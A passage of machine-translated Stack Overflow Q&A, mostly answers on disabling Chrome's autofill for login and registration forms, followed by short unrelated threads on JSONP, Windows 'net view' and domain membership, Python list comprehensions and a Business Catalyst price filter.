抱歉写了这么多，我只是想确保一切都清楚。我希望它有所帮助。

* * *

## 回答 #36

> 赞同：2
> 
> 时间：2016-02-08T02:36:23.920

而不是“这对我有用”的答案和其他看起来像完整黑客的答案......这是目前chrome（和最新规范）将如何处理元素`autocomplete`上的属性`input`：

[https://developers.google.com/web/fundamentals/design-and-ui/input/forms/label-and-name-inputs?hl=en](https://developers.google.com/web/fundamentals/design-and-ui/input/forms/label-and-name-inputs?hl=en)

TLDR：添加`autocomplete='<value>'`您的输入，其中`<value>`应该是定义字段用途的任何字符串。这与`name`属性类似。尽可能使用上面链接中的建议值。

此外，从您的表单中删除自动完成属性

* * *

## 回答 #37

> 赞同：2
> 
> 时间：2018-05-20T19:10:39.063

我的解决方案取决于三件事：

1.  按键事件
2.  屏蔽字段名称
3.  在提交时消隐字段值

首先，我们需要防止用户名和密码的自动完成，所以，最初我们将设置两个标志，i -> 用户名和 j -> 密码为真值，所以没有任何对字段 i 和 j 的 keydown真的。

如果字段屏蔽发生在服务器端，通过传递随机字符串，它也可以很容易地使用客户端进行。

这是代码：

```
$(document).ready(function(){
   i= true; //username flag
   j= true; // password flag
   $("#username{{$rand}}").keydown(function(e){
          // {{$rand}} is server side value passed in blade view
          // keyboard buttons are clicked in the field
            i = false;       
    });
   $("#passowrd{{$rand}}").keydown(function(e){
          // {{$rand}} is server side value passed in blade view
          // keyboard buttons are clicked in the field
            j = false;       
    });
    // Now we will use change event,
   $("#username{{$rand}}").change(function(){
    if($(this).val() != ''){ //the field has value
        if(i){ // there is no keyboard buttons clicked over it
            $(this).val(''); // blank the field value
        }

    }
})
$("#password{{$rand}}").change(function(){
    if($(this).val() != ''){ // the same as username but using flag j
        if(j){
            $(this).val('');
        }

    }
})

   $("#sForm").submit(function(e){ // the id of my form
      $("#password-s").val($("#password{{$rand}}").val());
        $("#username-s").val($("#username{{$rand}}").val());
        // Here the server will deal with fields names `password` and `username` of the hidden fields
       $("#username{{$rand}}").val('');
        $("#password{{$rand}}").val(''); 

 })
}) 
```

这是HTML：

```
<form class="form-horizontal" autocomplete="off" role="form" id="sForm" method="POST" action="https://example.com/login">

                        <input type="hidden" name="password" id="password-s">
                        <input type="hidden" name="username" id="username-s">

                            <label for="usernameTDU3m4d3I5" class="col-md-3 control-label" style="white-space: nowrap">Username</label>

                                <input id="usernameTDU3m4d3I5" placeholder="Username" autocomplete="off" style="border-bottom-left-radius: 10px; border-top-right-radius: 10px; font-family: fixed; font-size: x-large;" type="text" class="form-control" name="usernameTDU3m4d3I5" value="" required="required" autofocus="">                                

                            <label for="passwordTDU3m4d3I5" class="col-md-3 control-label" style="white-space: nowrap">Password</label>
                                <input id="passwordTDU3m4d3I5" placeholder="Password" autocomplete="off" type="password" class="form-control" name="pa-TDU3m4d3I5" required="">

                                <button type="submit" class="btn btn-success">
                                    <i class="fox-login" style="text-shadow: 0px 1px 0px #000"></i><strong>Login</strong>&nbsp;&nbsp;
                                </button>

                                </form> 
```

确实，上述解决方案不会消除或阻止用户名和密码的自动完成，但它会使自动完成变得无用。即没有在字段上点击键盘按钮，在提交之前字段值将是空白的，因此将要求用户输入它们。

### 更新

我们还可以使用点击事件来防止用户列表自动完成出现在字段下，如下所示：

```
 $("#username{{$rand}}").click(function(){

            $(this).val('');
            i = true;

})
$("#password{{$rand}}").click(function(){

            $(this).val('');
            j = true;

}) 
```

### 限制：

此解决方案在触摸屏设备中*可能无法正常工作。*

# 最终更新

我已经完成了以下干净的实现，如下所示：

```
preventAutoComplete = true; // modifier to allow or disallow autocomplete
trackInputs = {password:"0", username:"0"}; //Password and username fields ids as object's property, and "0" as its their values
// Prevent autocomplete
    if(preventAutoComplete){
        $("input").change(function(e){ // Change event is fired as autocomplete occurred at the input field 
            trackId = $(this).attr('id'); //get the input field id to access the trackInputs object            
            if (trackInputs[trackId] == '0' || trackInputs[trackId] != $(this).val()){ //trackInputs property value not changed or the prperty value ever it it is not equals the input field value
                $(this).val(''); // empty the field
            }
        });
        $("input").keyup(function(e){
            trackId = $(this).attr('id');
            trackInputs[trackId] = $(this).val(); //Update trackInputs property with the value of the field with each keyup.
        });
    } 
```

* * *

## 回答 #38

> 赞同：1
> 
> 时间：2014-09-20T16:21:24.640

除了 autocomplete="off" 之外，还必须将值设置为空 (value="") 才能使其工作。

* * *

## 回答 #39

> 赞同：1
> 
> 时间：2016-03-29T11:42:03.780

所以显然，最好的修复/黑客现在不再起作用了。我使用的 Chrome 版本是 49.0.2623.110 m，我的帐户创建表单现在显示与表单无关的已保存用户名和密码。谢谢铬！其他黑客似乎很可怕，但这种黑客不那么可怕......

为什么我们需要这些黑客工作是因为这些表格通常是帐户创建表格，即不是应该允许填写密码的登录表格。您不希望删除用户名和密码的麻烦的帐户创建表格。从逻辑上讲，这意味着永远不会在渲染时填充密码字段。所以我使用了一个文本框和一些 javascript。

```
<input type="text" id="password" name="password" />

<script>
    setTimeout(function() {
        $("#password").prop("type", "password");
    }, 100); 
    // time out required to make sure it is not set as a password field before Google fills it in. You may need to adjust this timeout depending on your page load times.
</script> 
```

我发现这是可以接受的，因为用户不会在短时间内访问密码字段，并且如果该字段是密码字段，则回发到服务器没有任何区别，因为无论如何它都是以纯文本形式发回的。

警告：如果像我一样，您使用与更新表单相同的创建表单，事情可能会变得棘手。我使用 mvc.asp c#，当我使用 @Html.PasswordFor() 时，密码不会添加到输入框中。这是一件好事。我已经对此进行了编码。但是使用@Html.TextBoxFor() 并且密码会被添加到输入框中，然后隐藏为密码。但是，由于我的密码是散列的，输入框中的密码是散列密码，永远不应该发回服务器 - 意外保存散列散列密码对于尝试登录的人来说会很痛苦。基本上.. . 如果使用此方法，请记住在渲染输入框之前将密码设置为空字符串。

* * *

## 回答 #40

> 赞同：1
> 
> 时间：2017-09-13T19:05:28.233

如果`display: none`不起作用，这也是可能的并且它似乎正在工作（Chrome v60.0.3112.113）：

```
.hidden-fields {
    opacity: 0;
    float: left;
    height: 0px;
    width: 0px;
}

<input type="text" name="username" class="hidden-fields"> 
<input type="password" name="password" class="hidden-fields">

<your actual login fields></your actual login fields> 
```

* * *

## 回答 #41

> 赞同：1
> 
> 时间：2017-11-29T16:54:38.003

**纯 HTML 解决方案**：

（不需要javascript，不需要css，也不需要隐藏输入）

```
<form autoComplete="new-password" ... >
        <input name="myInput" type="text" autoComplete="off" id="myInput" placeholder="Search field" />
</form> 
```

笔记：

*   表单不一定需要是输入元素的直接父级
*   输入需要一个名称属性

* * *

## 回答 #42

> 赞同：1
> 
> 时间：2016-09-06T09:20:33.380

在 Chromium 53.0.2785.92（64 位）上，以下工作

```
<div style="visibility:hidden">
    <input type="text" name="fake_username_remembered">
    <input type="password" name="fake_password_remembered">
</div> 
```

`display:none`不工作

* * *

## 回答 #43

> 赞同：1
> 
> 时间：2015-12-07T11:30:40.877

我需要一些额外的字段才能正常工作，因为 chrome 实际上填充了许多字段。而且我还需要以一种比 display:none 更奇特的方式隐藏字段才能真正起作用。

```
<style>.stylish { position:absolute; top:-2000px; }</style>
<input id="_____fake_email_remembered" class="stylish" tabindex="-1"  type="email" name="email_autofill"/> 
<input id="_____fake_userName_remembered" class="stylish" tabindex="-1"  type="text" name="userName_autofill"/>
<input id="_____fake_firstName_remembered" class="stylish" tabindex="-1"   type="text" name="firstName_autofill"/>
<input id="_____fake_lastName_remembered" class="stylish" tabindex="-1"   type="text" name="lastName_autofill"/>
<input id="_____fake_phone_remembered" class="stylish"  tabindex="-1"  type="text" name="phone_autofill"/>
<input id="_____fake_address_remembered" class="stylish"  tabindex="-1"   type="text" name="address_autofill"/>
<input id="_____fake_password_remembered" class="stylish"  tabindex="-1"   type="password" name="password_autofill"/>
<input id="_____fake_password_remembered2" class="stylish"  tabindex="-1"   type="password" name="passwordRepeated_autofill"/> 
```

* * *

## 回答 #44

> 赞同：1
> 
> 时间：2015-08-03T16:50:12.140

就像 Dvd Franco 说的那样，对我来说，只在它工作的所有领域都设置了 automplete='off'。所以我把这个 jquery 规则放在 $(document).ready(); 在我的主 .js 文件上运行

```
$('form.no_autofill').attr('autocomplete','off');
$('.no_autofill input').attr('autocomplete','off'); 
```

* * *

## 回答 #45

> 赞同：1
> 
> 时间：2018-05-08T16:23:04.583

自动完成功能已通过此技巧成功禁用。 **有用！**

***[HTML]***

```
<div id="login_screen" style="min-height: 45px;">
   <input id="password_1" type="text" name="password">
</div> 
```

***[jQuery]***

```
$("#login_screen").on('keyup keydown mousedown', '#password_1', function (e) {
    let elem = $(this);

    if (elem.val().length > 0 && elem.attr("type") === "text") {
        elem.attr("type", "password");
    } else {
        setTimeout(function () {
            if (elem.val().length === 0) {
                elem.attr("type", "text");
                elem.hide();
                setTimeout(function () {
                    elem.show().focus();
                }, 1);
            }
        }, 1);
    }

    if (elem.val() === "" && e.type === "mousedown") {
        elem.hide();
        setTimeout(function () {
            elem.show().focus();
        }, 1);
    }

}); 
```

* * *

## 回答 #46

> 赞同：1
> 
> 时间：2017-09-07T17:17:28.717

Boom、谷歌浏览器和其他任何人都试图打败它。

我能够在 2017 年 9 月 7 日实现这一点，但使用的是在我的 MVC 视图中生成的随机字符串的 FormCollection。

我将首先在我的登录页面的索引控制器中获得一个新的随机密钥，加密并创建一个新的完全唯一的随机字符串（我实际上使用 256 位密码来执行此操作，以及一个唯一的密码和身份验证密钥），然后我追加每个字符串末尾的纯文本“用户名”和“密码”，以便稍后帮助我从响应视图控制器中识别用户名和密码。只要您知道模式并且它是唯一的，您也可以将该纯字符串更改为任何内容。

在我看来，然后我适当地使用了这些变量，然后在响应控制器中 - 通过 FormCollection 搜索并找到我匹配的变量 - 然后使用该项目的键值作为相应的用户名和密码来进行适当的处​​理。

我认为 Chrome 偷偷摸摸的另一个问题是，任何

有什么想法吗 ？

```
<style>
    @@font-face {
      font-family: 'password';
      font-style: normal;
      font-weight: 400;
      src: url(https://jsbin-user-assets.s3.amazonaws.com/rafaelcastrocouto/password.ttf);
    }
</style>

<input type="text" name="@Model.UsernameRandomNameString" />
<input style="font-family: 'password'" type="text" name="@Model.PasswordRandomNameString" />

LogOnModel model = new LogOnModel()
            {
                UsernameRandomNameString = Cryptography.SimpleEncrypt("Username", UniqueGeneratorKey, UniqueGeneratorKey) + "Username",
                PasswordRandomNameString = Cryptography.SimpleEncrypt("Password", UniqueGeneratorKey, UniqueGeneratorKey) + "Password",
            }; 
```

我认为这是一个很好的解决方法，但是嘿它有效，而且我认为它也可能是未来的证明，除非谷歌确定页面的 URL 中有关键词，然后适当地在任何输入字段的顶部添加其愚蠢的扩展- 但这有点激烈。

* * *

## 回答 #47

> 赞同：1
> 
> 时间：2018-04-23T15:17:20.620

对于 Angular 用户：

由于`autocomplete = 'off'`新的 chrome 版本忽略，chrome 开发人员建议 autocomplete='false | random-string'，所以谷歌浏览器/现代浏览器有两种类型的用户助手 -

> 1.  `autocomplete='off'`（这会阻止最后缓存的建议）。
> 2.  `autocomplete = 'false | random-string'`（这会阻止自动填充设置，因为浏览器不知道“随机字符串”）。

那么如果禁用这两个烦人的建议该怎么办？这是诀窍：-

1.  添加`autocomplete = 'off'`每个输入字段。（或简单的 Jquery）。

*示例*：`$("input").attr('autocomplete', 'off');`

2.  `<form name='form-name'>`从 HTML 代码中删除标签并添加`ng-form = 'form-name'`到您的`<div>`容器中。添加`ng-form="form-name"`还将保留您的所有验证。

* * *

## 回答 #48

> 赞同：0
> 
> 时间：2015-06-02T07:15:42.683

我在“立即登录或注册”模式窗口中遇到了这个问题，如果用户将他们的凭据保存到浏览器中，就会出现问题。登录和注册字段都已填充，因此我可以使用以下 Angular js 指令清除它们：

```
(function () {
    "use strict";

    var directive = function ($timeout) {
        return {
            restrict: "A",
            link: function (scope, element, attrs) {
                $timeout(function () {
                    element.val(" ");
                    $timeout(function () {
                        element.val("");
                    });
                });
            }
        };
    };

    angular.module("app.directives").directive("autofillClear", ["$timeout", directive]);
}());
```

它与之前使用 jquery 的一些答案基本相同，但以有角度的方式完成。

* * *

## 回答 #49

> 赞同：0
> 
> 时间：2017-02-12T11:02:08.103

如果您使用 Symfony 表单，`autocomplete=off`如果属性是从 twig 模板应用而不是使用`FormBuilder`.

用这个：

```
....
->add('field-name', TextType::class, array(
  'attr' => array(
      'autocomplete' => 'off'
  )
)
.... 
```

而不是：

```
....
{{ form_widget(form.field-name, {'attr': {'autocomplete':'off'}})
.... 
```

* * *

## 回答 #50

> 赞同：0
> 
> 时间：2015-07-15T08:58:21.840

我知道这并不完全相关，但这就是我所做的。自动填充的字段会引发“更改”事件，但前提是您尽早将其绑定到它们。

所以我把这个放在头部。

```
 $(document).ready(function(){
            $('input').on('change',function(){$(this).val('')})
     }); 
```

它对我有用。

* * *

## 回答 #51

> 赞同：0
> 
> 时间：2017-12-24T19:16:03.267

我已经尝试了所有提到的建议，但没有一个奏效。我在特定输入上使用谷歌地方自动完成功能，如果在谷歌地方自动完成列表上方有一个谷歌浏览器自动填充功能，那就太难看了。即使设置 autocomplete="anything" 也是无用的，因为自动完成插件本身将此属性设置为“关闭”，并且它完全被 chrome 忽略。

所以我的解决方案是：

```
var fixAutocomplete = window.setInterval(function(){
    if ($('#myinput').attr('autocomplete') === 'false') {
        window.clearInterval(fixAutocomplete);  
    }

    $('#myinput').attr('autocomplete', 'false');
}, 500); 
```

* * *

## 回答 #52

> 赞同：0
> 
> 时间：2016-02-12T20:28:19.440

不幸的是，这些解决方案似乎都不起作用。我能够使用

```
 <!-- fake fields are a workaround for chrome autofill getting the wrong fields -->
                    <input style="display:none" type="text" name="fakeusernameremembered"/>
                    <input style="display:none" type="password" name="fakepasswordremembered"/> 
```

技术，但密码仍然填充。

* * *

## 回答 #53

> 赞同：0
> 
> 时间：2017-07-05T12:11:04.587

这些问题的其他解决方案都不适合我。

唯一有效的是[这个](https://stackoverflow.com/a/25229226/5802289)：

> 它从元素中删除“name”和“id”属性，并在 1ms 后将它们分配回来。把这个放在文件准备好。

```
$(document).ready(function() {
    $('form[autocomplete="off"] input, input[autocomplete="off"]').each(function () {

                var input = this;
                var name = $(input).attr('name');
                var id = $(input).attr('id');

                $(input).removeAttr('name');
                $(input).removeAttr('id');

                setTimeout(function () {
                    $(input).attr('name', name);
                    $(input).attr('id', id);
                }, 1);
            });
}); 
```

* * *

## 回答 #54

> 赞同：0
> 
> 时间：2016-05-06T12:55:26.907

通过添加“display：none;”来隐藏它的方法 如果表单是通过 javascript 生成的，那么输入对我不起作用。

因此，我通过将它们放置在视线之外来使它们不可见：

```
<input style="width:0;height:0;opacity:0;position:absolute;left:-10000px;overflow:hidden;" type="text" name="fakeusernameremembered"/>
<input style="width:0;height:0;opacity:0;position:absolute;left:-10000px;overflow:hidden;" type="password" name="fakepasswordremembered"/> 
```

* * *

## 回答 #55

> 赞同：0
> 
> 时间：2017-10-02T12:07:29.997

没有一个解决方案对我有用。最后，在拉了我的头发好几个小时后，我想出了这个 ReactJS 的解决方案。

在 FireFox 54.0.1、Chrome 61.0.3163.100、Mac OS 10.13 上测试

我保留`type="text"`并将其更改为`onChange`事件的相关类型。

例如：HTML：

`<input type="text" onChange={this.setAttributes} placeholder="Email" />`

JS：

```
setAttr2: function(e){
    var value = e.target.value;
    if(value.length){
      e.target.setAttribute('type', 'email')
    } else {
      e.target.setAttribute('type', 'text')
    }
  } 
```

* * *

## 回答 #56

> 赞同：0
> 
> 时间：2016-12-05T15:18:35.650

由于 display none 似乎不再起作用，因此添加

```
<input type="text" name="fakeusernameremembered"/>
<input type="password" name="fakepasswordremembered"/> 
```

在隐藏溢出、最大宽度和最大高度 0px 的 div 内

所以它变成了这样的东西：

```
<div style="overflow: hidden; max-width: 0px; max-height: 0px;">
    <input type="text" name="fakeusernameremembered"/>
    <input type="password" name="fakepasswordremembered"/>
</div> 
```

* * *

## 回答 #57

> 赞同：0
> 
> 时间：2017-12-20T14:10:31.590

我的问题是 Chrome 会通过 Bootstrap 自动完成界面自动填充邮政编码，因为我会自动从我的数据库中建议可能的值。

我必须做的事情：

*   将输入字段的`id`属性更改为“邮政编码”以外的其他内容
*   将输入字段的`autocomplete`值更改为`false`
*   调用后`$('#postcode_field').autocomplete(...)`我不得不重置自动完成属性，`$('#postcode_field').prop('autocomplete', 'false');`因为 Boostrap 的自动完成插件将其更改为`off`自动。

* * *

## 回答 #58

> 赞同：0
> 
> 时间：2016-02-10T00:22:18.480

我的 hack — 在 Chrome 48 中测试：

由于 Chrome 试图通过查看类似`id`或`name`的属性以及`<input>`相关`<label>`内容来找出字段的类型，因此您只需要为这些找到无意义的名称即可。

对于`id`and `name`，很容易选择[此处](https://developers.google.com/web/fundamentals/design-and-ui/input/forms/label-and-name-inputs)未列出的其他内容。

对于`label`，我在中间插入了一个不可见`<span>`的，例如一个城市（它弄乱了我的[Places 自动完成功能）](https://developers.google.com/maps/documentation/javascript/examples/places-autocomplete)：

```
<span>Ci<span style="display:none">*</span>ty</span> 
```

完整的工作示例：

```
<!DOCTYPE html>
<html>
  <body>
    <form method="post" action="/register">
      <div>
        <label for="name">Name</label>
        <input id="name" type="text" name="name" />
      </div>
      <div>
        <label for="email">Email</label>
        <input id="email" type="text" name="email" />
      </div>
      <div>
        <label for="id1">City</label>
        <input id="id1" type="text" name="id1" /> <-- STILL ON :(
      </div>
      <div>
        <label for="id2">Ci<span style="display:none">*</span>ty</label>
        <input id="id2" type="text" name="id2" /> <-- NOW OFF :)
      </div>
    </form>
  </body>
</html>
```

* * *

## 回答 #59

> 赞同：0
> 
> 时间：2017-01-20T04:28:37.950

1 月 20 日铬更新

上述解决方案均无效，包括添加虚假字段或设置 autocomplete=new-password 。是的，这些 chrome 不会自动完成，但是当您输入密码字段时，它会再次提示密码。

我发现如果您删除密码字段，然后在*没有 id 的情况下*再次添加它，那么 chrome 不会自动填充它，并且不会在输入时提示密码。

使用类来获取密码值而不是 id。

对于 Firefox，仍然需要添加一个虚拟元素。

此解决方案还允许基于标志允许/禁止自动完成：

html:

```
<!-- form is initially hidden, password field has a dummy id and a class 'id' -->
<form id="loginForm" style="display:none;">
   <span>email:</span><input type="text" placeholder="Email" id="loginEmailInputID"/>
   <span>Password:</span><input class="loginPasswordInput" type="password" placeholder="Password" id="justForAutocomplete"/>
</form> 
```

页面加载：

```
function hideAutoComplete(formId) {
    let passwordElem=$('#'+formId+' input:password'), prev=passwordElem.prev();
    passwordElem.remove();
    prev.after($('<input type="password" style="display:none">'), passwordElem.clone().val('').removeAttr('id'));
}

if (!allowAutoComplete) hideAutoComplete('loginForm');
$('#loginForm').show(); 
```

当您需要密码时：

```
$('.loginPasswordInput').val(); 
```

* * *

## 回答 #60

> 赞同：0
> 
> 时间：2017-09-25T09:55:29.610

Jobin Jose 的回答让我吃了一惊。这对我有用：

```
<input type="password" name="password" id="password_fake" style="display:none;" />
<input type="password" name="password"/> 
```

确保没有 autocomplete="off"，这会破坏解决方案。

* * *

## 回答 #61

> 赞同：0
> 
> 时间：2018-03-21T09:24:41.967

我所做的是将输入类型=“文本”更改为多行输入，即。

```
 overflow-x:hidden;
 overflow-y:hidden;
 vertical-align:middle;
 resize: none; 
```

代码的快速解释：overflow-x 和 -y hidden 将禁用 textarea 框右侧的滚动按钮。垂直 algin 将标签垂直中间与文本区域对齐，并且 resize: none 将禁用文本区域右下角的调整大小抓取器。

从本质上讲，这意味着您的文本区域将看起来像一个文本框，但关闭了 chrome 自动填充功能。

* * *

## 回答 #62

> 赞同：0
> 
> 时间：2015-09-10T14:08:45.047

为用户名字段输入值“”（空格）。

```
<input type = 'text' value = ' ' name = 'username' /> 
```

如果您曾经使用用户输入的值填充用户名，如果没有用户输入的值，则代码输入“”。

编辑：我还必须将“用户名”字段更改为“用户名”以外的名称，例如“用户名”

* * *

## 回答 #63

> 赞同：-1
> 
> 时间：2016-04-07T17:53:31.313

以为我会发布我的修复程序。发现你不能使用 display:none 所以我想出了一个快速而肮脏的解决方案，只是让假输入变小并将其移出视线。到目前为止一切顺利，直到他们再次打破它。

```
 <input id="FakePassword" type="password" style="float:left;position:relative;height:0;width:0;top:-1000px;left:-1000px;" />
```

* * *

## 回答 #64

> 赞同：-1
> 
> 时间：2016-02-25T03:34:21.773

使用 chrome，如果您用标签包围输入并在标签内输入街道、地址或两者兼而有之，它将忽略任何禁用自动填充的尝试。

```
<label for="searchAddress" class="control-label"> Street Address <input type="text" class="form-control" name="searchAddress></label> 
```

Chrome 会检测标签中的关键字以确定输入类型。它也可能与其他关键字一起使用。

* * *

## 回答 #65

> 赞同：-1
> 
> 时间：2017-04-07T00:54:41.637

我终于通过在输入字段中放入一个非重复变量来解决这个问题 - 我使用了 php time() 像这样：

```
<input type="text" name="town['.time().']" > 
```

这主要是干扰n android。我在服务器端所做的只是对输入名称进行 foreach 循环 - 问题是如果 chrome 识别出它会自动填充的名称属性。

没有别的东西对我有用。

* * *

## 回答 #66

> 赞同：-2
> 
> 时间：2015-09-27T20:14:53.573

我的解决方案：

```
$(function(){
    $("form[autocomplete=off]").find('input').attr('autocomplete', 'false');
}); 
```

它在具有“autocomplete="off"' 的表单中的所有输入字段上设置属性 'autocomplete="false"'。

这适用于 chrome、firefox 和 safari。

* * *

## 回答 #67

> 赞同：-2
> 
> 时间：2017-01-13T12:43:56.073

上次我检查 Google 在 2017 年 1 月更新了他们的自动填充时，对我有用的解决方案是添加另一个输入并在填充后隐藏它。

```
 <input type="text" id="phone_number" name="phone_number" value="">
 <input type="text" id="dummy_autocomplete">

<script type="text/javascript">
        $('#dummy_autocomplete').hide();
</script> 
```

* * *

## 回答 #68

> 赞同：-7
> 
> 时间：2018-05-03T11:10:11.947

这是我使用的最新解决方案。

```
$('#email').prop('autocomplete', true); 
```*

# jquery - 如何使用 jQuery ajax 从此 json 字符串获取 jsonp 响应

> ID：15738260
> 
> 赞同：0
> 
> 时间：2013-04-01T05:45:21.440
> 
> 标签：jquery, ajax, jsonp

我似乎找不到任何信息来帮助我解决这个问题，或者我做错了这很可能是这种情况。我在这个 URL 上有一些示例 JSON 数据：

[http://dev.plaidduckdesign.com/zen/album.php?aid=1037521524](http://dev.plaidduckdesign.com/zen/album.php?aid=1037521524)

注意：加载该页面大约需要 20 秒....

我通过一个 json 验证器运行它，它回来了。我正在尝试从该页面请求数据，只是使用 jonsp dataType 的 ajax 请求，因为它不在同一个域中。但我所做的一切都不起作用。我只是不断收到一个未知错误。这是我的ajax请求：

```
$.ajax({
    url: url,
    dataType: "jsonp",
    data: request,
    success: function(data, textStatus, jqXHR) {
        var obj = jQuery.parseJSON(rootData);
        alert(obj[0].url);
    },
    error: function(jqXHR, textStatus, errorThrown) {
        //alert("error ") 
    } // end error:
}); // end ajax 
```

我还没有真正获得成功的方法，只是错误。

非常感谢任何信息或指向正确方向的信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:50:07.240

为了使跨域调用正常工作，远程服务器必须支持 JSONP，而不是 JSON。情况似乎并非如此。目前响​​应如下所示：

```
[
    {
        url: "http://pizzutistudiosphotography.zenfolio.com/img/s8/v74/p1492770658-6.jpg?sn=3&tk=o4bxcOgmoSJ03SfRC3fclWNn73JkTdATCgOQI0JQxKA=",
        width: 640,
        height: 960,
        title: "F2013_0120_Daoust_001",
        copy: "© pizzuti studios photography | pizzutistudios.com",
        caption: "Please respect our copyright. For more information please visit <a target="_blank" href="http://pizzutistudios.com">http://pizzutistudios.com</a>"
    },
    {...}
] 
```

这是一个有效的 JSON。但为了使其正常工作，网站需要支持[`JSONP`](http://en.wikipedia.org/wiki/JSONP)格式，如下所示：

```
somecallback(
    [
        {
            url: "http://pizzutistudiosphotography.zenfolio.com/img/s8/v74/p1492770658-6.jpg?sn=3&tk=o4bxcOgmoSJ03SfRC3fclWNn73JkTdATCgOQI0JQxKA=",
            width: 640,
            height: 960,
            title: "F2013_0120_Daoust_001",
            copy: "© pizzuti studios photography | pizzutistudios.com",
            caption: "Please respect our copyright. For more information please visit <a target="_blank" href="http://pizzutistudios.com">http://pizzutistudios.com</a>"
        },
        {...}
    ]
) 
```

`somecallback`应在请求中指定的位置。

您应该联系网站的作者并询问他们的网站是否支持 JSONP。如果不是，您不能通过 AJAX 调用来使用它。作为替代方案，您可以在您的域上编写一个服务器端脚本，该脚本将充当桥梁并将请求发送到远程域。然后将您的 AJAX 请求发送到您自己的脚本。

# web-services - cmd中net查看问题

> ID：15738264
> 
> 赞同：0
> 
> 时间：2013-04-01T05:46:08.907
> 
> 标签：web-services, networking, cmd, windows-xp, file-sharing

好的，所以我一直在网上寻找，但没有找到解决我的**net view**命令问题的答案。错误如下：

```
 C:\windows\system32>net view_
 There are no entries in the list

 C:\windows\system32>_ 
```

现在从我在线阅读的内容来看，这是由于未启用 winNT 机器上的来宾帐户并将其设置为网络的备份浏览器时引起的。两个问题...我没有 Windows NT 机器，我没有“计算机浏览器备份”。所以我不知道我需要做什么才能启动并运行它。我在***services.msc***下启用了**文件共享**和**计算机浏览器**，但没有显示我网络上的计算机。它们也都通过同一个工作组连接。

 ** * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T11:03:28.170

要使 NetBIOS 正常工作，必须在所有主机上打开以下端口：

```
137/udp (NetBIOS Name Service)
138/udp (NetBIOS Datagram Distribution Service)
139/tcp (NetBIOS Session Service) 
```

我也建议打开`445/tcp`（Direct SMB）。

如果您启用了 Windows 防火墙，则必须为所有这些端口添加例外。*

# windows - 更改了 Windows 7 机器上的域。我怎样才能恢复到原来的域名？

> ID：15738265
> 
> 赞同：0
> 
> 时间：2013-04-01T05:46:16.547
> 
> 标签：windows, networking, login, dns

我的 Windows 7 笔记本电脑加入了一个名为 TestDomain1 的域。然后我把我的笔记本电脑带到了一个新的办公地点，仍然能够登录到域 TestDomain1。但是我将笔记本电脑更改为特定办公室正在使用的新域，比如说 TestDomain2，我能够连接到 TestDomain2。但问题是，我想回去设置笔记本电脑再次使用 TestDomain1，但它不会让我因为我没有连接到 TestDomain1 网络。

问题：

1.  我之前使用 TestDomain1\TestUser 登录。但是现在由于我将笔记本电脑的域更改为 TestDomain2，我无法登录到以前的帐户，有没有办法可以再次登录到 TestDomain1\TestUser？

2.  即使没有物理连接到 TestDomain1 的网络，我是否可以将域更改回 TestDomain1？

请帮忙。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T07:21:08.803

最初，您的笔记本电脑是 TestDomain1 的成员。然后即使您无法联系到域控制器也可以登录到域，因为以前的登录缓存会在那里，请参阅下面提到的页面

```
http://technet.microsoft.com/en-us/library/cc755473%28WS.10%29.aspx
http://support.microsoft.com/kb/172931 
```

然后你移动到另一个域TestDomain2，所以如果你想再次移动回TestDomain1，你需要与第一个域控制器建立连接。

# python - 为列表中的每个项目添加一个字符

> ID：15738267
> 
> 赞同：25
> 
> 时间：2013-04-01T05:46:20.027
> 
> 标签：python

假设我有一张纸牌花色列表，如下所示：

`suits = ["h","c", "d", "s"]`

我想为每个花色添加一种牌，这样我的结果就像

`aces = ["ah","ac", "ad", "as"]`

有没有一种简单的方法可以做到这一点，而无需重新创建一个全新的列表并使用`for`循环？

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2013-04-01T05:47:36.580

这必须是“最简单”的方式

```
>>> suits = ["h","c", "d", "s"]
>>> aces = ["a" + suit for suit in suits]
>>> aces
['ah', 'ac', 'ad', 'as'] 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-01T05:51:06.337

另一种选择，地图功能：

```
aces = map(( lambda x: 'a' + x), suits) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-04-01T06:24:27.513

如果你想添加一些不同于“a”的东西，你也可以试试这个：

```
foo = ['h','c', 'd', 's']
bar = ['a','b','c','d']
baz = [x+y for x, y in zip(foo, bar)]
>>> ['ha', 'cb', 'dc', 'sd'] 
```

# business-catalyst - 在 Business Catalyst 中添加价格范围搜索

> ID：15738269
> 
> 赞同：0
> 
> 时间：2013-04-01T05:46:24.463
> 
> 标签：business-catalyst

您能告诉我如何在 Business Catalyst 中添加价格范围吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T15:16:18.527

您是否尝试设置产品搜索？如果是这样，以下是 BC 知识库中的说明：http: [//kb.worldsecuresystems.com/652/bc_652.html](http://kb.worldsecuresystems.com/652/bc_652.html)

只需使用下拉菜单选择价格范围：http: [//prntscr.com/105oei](http://prntscr.com/105oei)

这有帮助吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-22T09:53:45.253

我希望这有帮助

```
jQuery(document).ready(function() {
$("#search-826").children('div').each(function() {
            if ($(this).data("listing-price") <= 20.00) {
                $(this).hide();
            }
        });
  });
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<div class="search-results" id="search-826">
<div class="product" data-listing-price="2.00">
  <div class="image">
    <img src="http://placehold.it/150x150">
  </div>

            <h3>Parasol</h3>
        <h4>£2.00</h4>
</div>
<div class="product" data-listing-price="5.00">
  <div class="image">
    <img src="http://placehold.it/150x150">
  </div>

            <h3>Parasol</h3>
        <h4>£5.00</h4>
</div>
<div class="product" data-listing-price="25.00">
  <div class="image">
    <img src="http://placehold.it/150x150">
  </div>

            <h3>Parasol</h3>
        <h4>£25.00</h4>
</div>
<div class="product" data-listing-price="250.00">
  <div class="image">
    <img src="http://placehold.it/150x150">
  </div>

            <h3>Parasol</h3>
        <h4>£250.00</h4>
</div>
<div class="product" data-listing-price="50.00">
  <div class="image">
    <img src="http://placehold.it/150x150">
  </div>

            <h3>Parasol</h3>
        <h4>£50.00</h4>
</div></div>
```

# java - 模式匹配器 IllegalStateException

> ID：15738275
> 
> 赞同：0
> 
> 时间：2013-04-01T05:46:38.090
> 
> 标签：java, regex

